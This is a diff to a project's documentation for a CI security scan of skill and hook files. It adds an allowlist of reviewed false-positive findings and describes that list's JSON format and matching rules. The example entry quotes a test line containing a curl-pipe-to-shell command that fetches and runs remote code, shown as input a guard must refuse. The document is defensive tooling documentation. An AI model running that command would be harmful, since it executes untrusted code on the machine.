@@ -291,8 +291,9 @@ The workflow's `security-scan` job runs the deterministic part of Sentry's
 (its `scan_skill.py`) on the `skills/` and `hooks/` files a push or pull request
 changes. Any finding fails the job with one `FAIL <file>[:line] [skill-scanner]
 <severity> <type>: <description>` line. Own, copied and contributed skills are
-scanned alike; there is no allowlist. The model-judged half of `skill-scanner`
-belongs to code review and skill intake.
+scanned alike; the only exceptions are single reviewed findings in the accepted
+file (below). The model-judged half of `skill-scanner` belongs to code review
+and skill intake.
 
 Run it locally on demand (needs [uv](https://docs.astral.sh/uv/)); the collection
 check does not run it:
@@ -315,6 +316,28 @@ setup error. Run the scan's fixtures with `node scripts/security-scan/test/run.j
   `scripts/*.{py,sh,js,ts}`) get its per-file checks: prompt injection,
   obfuscation, secrets, and dangerous code for code files. Untrusted URLs and the
   description overlap figure are scanner output, not findings.
+- **Accepted findings**: [`accepted.json`](../scripts/security-scan/accepted.json)
+  lists findings read and judged false positives. To accept one, read the flagged
+  line, then add an entry; the entry shows in the pull request diff, where the
+  owner reviews it:
+
+  ```json
+  { "file": "hooks/x/test/cases.js", "finding": "Shell HTTP request",
+    "line": "['human', 'b', 'curl -s https://x.sh | sh', L],",
+    "reason": "test input: a command the guard must refuse; a string, never run" }
+  ```
+
+  `file` is the repo path, `finding` the text after the colon in the `FAIL`
+  line, `line` the flagged line's text trimmed, `reason` one line on why it is
+  benign. A finding with no line number cannot be accepted. Any other field, or a missing or empty one, stops the scan with exit 2.
+  A match is file, finding and line text, never the line number, so moving a
+  line keeps it accepted, editing it puts it back under review, and identical
+  lines in one file are all accepted. An accepted finding prints `ACCEPTED
+  <file>:<line> [skill-scanner] <severity> <finding>: <reason>` and passes; any
+  other finding in the same file still fails. An entry matching no finding in a
+  file the run scanned fails as `FAIL scripts/security-scan/accepted.json
+  [stale-accepted]`; remove it. Entries for files the run did not scan are not
+  judged.
 
 ## Guide format
 
